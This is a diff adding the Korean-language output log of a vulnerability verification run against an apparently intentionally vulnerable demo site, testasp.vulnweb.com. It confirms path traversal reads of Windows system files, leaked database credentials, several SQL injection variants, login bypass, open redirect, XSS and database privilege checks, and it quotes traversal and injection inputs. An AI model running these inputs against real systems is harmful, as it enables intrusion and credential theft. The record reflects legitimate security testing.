@@ -1,0 +1,109 @@
+verify_chain — http://testasp.vulnweb.com (proxy=none)
+시작: 2026-09-28T08:27:51Z
+
+=== 0. 도달성 / 보안 헤더 ===
+  PASS  Server: Microsoft-IIS                                    ok
+  PASS  X-Powered-By: ASP.NET                                    (존재)
+  PASS  보안 헤더 부재: Content-Security-Policy            0
+  PASS  보안 헤더 부재: X-XSS-Protection                   0
+  PASS  보안 헤더 부재: X-Frame-Options                    0
+  PASS  보안 헤더 부재: Strict-Transport-Security          0
+
+=== 1. LFI #1 — Templatize.asp?item= (웹루트 밖 임의 파일 읽기) ===
+  PASS  대조군 item=html/about.html = 200                     200
+  PASS  item=../../../../windows/win.ini = 200                   200
+  PASS  win.ini 본문에 [fonts]                                (존재)
+  PASS  item=../../../../windows/system.ini = 200                200
+  PASS  item=../../../../windows/system32/drivers/etc/hosts = 200 200
+  PASS  부재 파일(부정 재확인) global.asa = 500         500
+
+=== 2. LFI #2 — shownews.asp?item= (미링크 orphan, 두 번째 인스턴스) ===
+  PASS  shownews.asp?item=win.ini = 200                          200
+  PASS  raw 파일 내용 반환([fonts])                        (존재)
+  PASS  템플릿 래퍼 없음(InstanceBegin 부재)            (부재 확인)
+  PASS  무파라미터(부정) = 500                            500
+
+=== 3. ASP 소스 평문 유출 (화이트박스 근거) ===
+  PASS  item=db.asp = 200                                        200
+  PASS  db.asp 에 접속문자열(Provider=SQLNCLI11)           (존재)
+  PASS  db.asp 에 DB 자격증명(Uid=acunetix)                 (존재)
+  PASS  Login.asp 소스에 문자열 결합 SQL                 (존재)
+
+=== 4. FrontPage 메타데이터 노출 (/_vti_cnf/) ===
+  PASS  /_vti_cnf/Default.asp = 200                              200
+  PASS  vti_backlinkinfo 노출                                  (존재)
+  PASS  vti_extenderversion 노출                               (존재)
+  PASS  /_vti_pvt/service.pwd 부재                             404
+  PASS  caveat: 실존 파일인데 _vti_cnf 404 (absence 오라클 부적합) ok
+
+=== 5. SQLi — showforum.asp?id= (boolean 오라클) ===
+  PASS  id=1 정상 = 200                                        200
+  PASS  id=1 AND 1=1 (참) = 200                                 200
+  PASS  id=1 AND 1=2 (거짓) = 500                              500
+
+=== 6. SQLi — showforum.asp?id= (스택드 시간차 오라클, 지연만 사용) ===
+        참조건 32.47s / 거짓조건 0.35s  (참조건이 45s 근처면 = 사이트 부하로 지연 확대, 비율 판정은 동일)
+  PASS  지연 오라클 성립(참조건만 2초 지연)        ok
+
+=== 7. SQLi — Search.asp?tfSearch= (UNION 10열 = 1요청 열람) ===
+  PASS  UNION 으로 DB_NAME() 렌더                            (존재)
+  PASS  UNION 으로 @@version 렌더                            (존재)
+  PASS  9열(열수 불일치) = 500                             500
+  PASS  showforum UNION 불가(열수 공유, 부정) = 500      500
+  PASS  showthread UNION 불가(부정) = 500                    500
+
+=== 8. 부정 — 오류 기반 SQLi 불가 / 상태코드 맹점 ===
+  PASS  문법오류 = 500 (IIS 기본 페이지)                500
+  PASS  문법오류 응답 크기 = 1208 (SQL 오류문 미노출) 1208
+
+=== 9. 인증우회 — POST Login.asp (SQLi) ===
+  PASS  우회 로그인 = 302                                   302
+  PASS  Location: Default.asp                                    (존재)
+  PASS  세션 쿠키(ASPSESSIONID) 발급                       (존재)
+  PASS  대조군: 없는 계정 = 200(로그인 실패)         200
+
+=== 10. 인증 전용 폼 개방 (읽기 전용 관찰) ===
+  PASS  게시 폼은 세션 보유 시에만 노출             ok
+
+=== 11. open redirect — RetURL (허용목록 검증 전무) ===
+  PASS  우회 로그인 + RetURL → Location: http://example.com/ (존재)
+  PASS  무인증 GET Logout.asp?RetURL= = 302                   302
+  PASS  Logout Location 값도 그대로 반영                  (존재)
+
+=== 12. XSS — 쓰기 없는 확인 (세션명 무이스케이프 렌더 + 보안 헤더 부재) ===
+  PASS  HTML 페이로드 로그인 = 302 (행 반환 조건 결합) 302
+  PASS  세션 uname 이 인코딩 없이 렌더(반사 XSS)     (존재)
+  PASS  HTML 인코딩 흔적(&lt;img) 부재 = 원문 출력    (부재 확인)
+  PASS  Login.asp: 세션 uname = 입력 원문(검증·이스케이프 없음) (존재)
+  PASS  Default.asp: 로그아웃 메뉴에 세션명 무이스케이프 출력 (존재)
+  PASS  CSP 헤더 없음(저장형 XSS 실행 가능)           0
+
+=== 13. second-order — 소스 조건만 확인(런타임 확인에는 쓰기 필요) ===
+  PASS  INSERT posts 에 Session.Contents("uname") 무이스케이프 결합 (존재)
+  PASS  tfSubject/tfText 는 따옴표만 이스케이프(HTML 인코딩 없음) (존재)
+
+=== 14. RCE 상한 + 임의 DML 권한 (실행 없는 오라클) ===
+  PASS  sysadmin=0 (RCE 배제)                                  (존재)
+  PASS  xp_cmdshell 비활성(=0)                                (존재)
+  PASS  CONTROL SERVER=0                                         (존재)
+  PASS  임의 DML 권한 존재(acuforum.users UPDATE=1)        (존재)
+  PASS  교차DB 쓰기 권한(acublog.users UPDATE=1)           (존재)
+
+=== 15. 민감 데이터 — 값이 아니라 '읽기 가능' 오라클 ===
+  PASS  upass 컬럼 읽기 가능(평문 자격증명 접근)   (존재)
+        참고(변동값): POSTS_ROWS=36 USERS_ROWS=252 
+
+=== 16. 부정 재확인 (재탐색 불필요) ===
+  PASS  /admin = 404                                             404
+  PASS  /web.config = 404                                        404
+  PASS  /global.asa = 404                                        404
+  PASS  IIS 8.3 단축명(defaul~1.asp) = 404                    404
+  PASS  TRACE = 501                                              501
+  PASS  PUT 업로드 거부(404/405)                            ok
+  PASS  PUT 대상 파일 미생성(GET 404)                     404
+
+=================================================
+결과: PASS=65  FAIL=0
+데이터 변경 0건 (계정·글·파일 생성 없음 / 거부되는 PUT 시도 1건, 파일 미생성 확인)
+실행 시각 2026-09-28T08:28:42Z — 이 데모는 수시 리셋되므로 이 시각 기준으로만 유효
+=================================================
